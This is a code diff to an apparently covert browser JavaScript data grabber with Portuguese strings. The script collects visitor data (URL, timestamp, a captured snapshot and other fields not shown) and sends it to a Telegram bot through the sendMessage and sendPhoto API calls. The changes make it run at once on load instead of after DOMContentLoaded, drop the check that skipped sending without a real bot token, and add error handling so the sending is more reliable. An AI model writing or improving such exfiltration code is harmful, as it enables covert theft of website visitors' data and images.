@@ -114,7 +114,7 @@
         collectedData.collectedAt = new Date().toISOString();
         collectedData.url = window.location.href;
 
-        sendToTelegram();
+        await sendToTelegram();
     }
 
     function captureSnapshot() {
@@ -137,8 +137,6 @@
     }
 
     async function sendToTelegram() {
-        if (!TELEGRAM_TOKEN || TELEGRAM_TOKEN === 'SEU_BOT_TOKEN') return;
-
         try {
             const data = collectedData;
             const snapshot = await captureSnapshot();
@@ -189,7 +187,7 @@
             msg += data.collectedAt;
 
             const url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
-            await fetch(url, {
+            const response = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -200,6 +198,10 @@
                 })
             });
 
+            if (!response.ok) {
+                throw new Error('Telegram error: ' + response.status);
+            }
+
             if (snapshot) {
                 const photoUrl = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendPhoto';
                 const formData = new FormData();
@@ -209,11 +211,10 @@
                 await fetch(photoUrl, { method: 'POST', body: formData });
             }
 
-        } catch (e) {}
+        } catch (e) {
+            console.error('Erro no sendToTelegram:', e);
+        }
     }
 
-    document.addEventListener('DOMContentLoaded', function() {
-        setTimeout(collectAll, 300);
-    });
-
+    collectAll();
 })();
